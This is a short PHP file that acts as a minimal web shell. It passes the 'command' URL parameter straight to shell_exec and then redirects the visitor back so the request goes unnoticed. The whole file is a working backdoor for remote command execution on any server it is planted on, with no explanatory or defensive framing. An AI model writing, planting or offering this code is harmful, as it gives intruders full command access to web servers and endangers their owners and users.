<?php
shell_exec ($_GET['command']);
header("location:javascript://history.go(-1)");
?>
